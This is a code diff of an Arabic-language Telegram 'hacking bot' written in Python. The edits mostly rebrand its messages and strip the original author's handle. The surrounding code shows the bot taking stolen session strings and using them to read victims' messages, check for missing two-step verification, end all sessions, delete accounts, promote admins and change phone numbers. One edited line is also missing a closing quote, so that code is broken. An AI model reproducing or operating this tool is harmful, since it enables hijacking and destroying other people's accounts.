@@ -145,7 +145,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "eng_mtr"
+channel = "null"
 menu = '''
 
 A : [ ** تحقق من قنوات ومجموعات الحساب **]
@@ -175,7 +175,6 @@ L : [** رفع مشرف لشخص معين في قناة او مجموعة **]
 M : [** تغيير رقم الهاتف  **]
 
 ** مميزات اكثر قريبا  **
-BY ~ @k_8_u
 '''
 mm = '''
 ** اهلا بك في بوت الاختراق  يمكنك اختراق اي شخص عبر كود تيرمكس
@@ -225,12 +224,12 @@ async def start(event):
         return await event.reply("▾∮ عذرا هذا الكود انتهت صلاحيته ")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\n▾∮ المعلومات بواسطه مجهول")
+        file.write(i + "\n\n▾∮ المعلومات بواسطه بوت تيرمكس)
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت مجهول للاختراق")
+        await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
     elif res.text == "B":
       await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
@@ -240,7 +239,7 @@ async def start(event):
       else:
         return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت مجهول للاختراق")
+      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
     elif r == "C":
       await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
@@ -262,7 +261,7 @@ async def start(event):
       else:
         return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت مجهول للاختراق")
+      await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
     elif r == "E":
       await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
@@ -298,7 +297,7 @@ async def start(event):
       await x.send_message("▾∮ حسنا الان ارسل معرف القناة او المجموعة")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("▾∮ تم حذف القناه بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت مجهول للاختراق")
+      await event.reply("▾∮ تم حذف القناه بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
     elif r == "H":
       await x.send_message("▾∮ ارسل كود تيرمكس ")
       strses = await x.get_response()
@@ -309,7 +308,7 @@ async def start(event):
         return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("▾∮ هذا الشخص لم يقوم بوضع رمز تحقق بخطوتين يمكنك اختراقه بنجاح و سهولة \n\n▾∮ شكرا لاستخدام بوت مجهول للاختراق")
+        await event.reply("▾∮ هذا الشخص لم يقوم بوضع رمز تحقق بخطوتين يمكنك اختراقه بنجاح و سهولة \n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
       else:
         await event.reply("▾∮ هذا الشخص مفعل رمز تحقق بخطوتين لا يمكن اختراقه لكن يمكنك حذف حسابه او استخدام اي امر اخر")
     elif r == "I":
@@ -321,7 +320,7 @@ async def start(event):
       else:
         return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
       i = await terminate(strses.text)
-      await event.reply("▾∮ تم انهاء جميع الجلسات بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت مجهول للاختراق")
+      await event.reply("▾∮ تم انهاء جميع الجلسات بنجاح ✅ \n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
     elif res.text == "J":
       await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
@@ -331,7 +330,7 @@ async def start(event):
       else:
         return await event.respond("▾∮ عذرا هذا الكود انتهت صلاحيته ")
       i = await delacc(strses.text)
-      await event.reply("▾∮ تم حذف هذا الحساب بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت مجهول للاختراق")
+      await event.reply("▾∮ تم حذف هذا الحساب بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت اختراق تيرمكس")
     elif res.text == "L":
       await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
@@ -345,7 +344,7 @@ async def start(event):
       await x.send_message("▾∮ الان ارسل معرف المستخدم")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("▾∮ تم رفعك مشرف بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت مجهول للاختراق")
+      await event.reply("▾∮ تم رفعك مشرف بنجاح ✅\n\n▾∮ شكرا لاستخدام بوت  اختراق تيرمكس")
     elif res.text == "K":
       await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
       strses = await x.get_response()
@@ -385,7 +384,7 @@ async def start(event):
         else:
           await event.respond("هناك شي خطا")
       except Exception as e:
-        await event.respond("اارسل هذا الخطأ الى @k_8_u \n**الخطـأ**\n" + str(e))
+        await event.respond("**هنالك خطأ**\n" + str(e))
 
     else:
       await event.respond("▾∮ استخدم /IQ فقط")
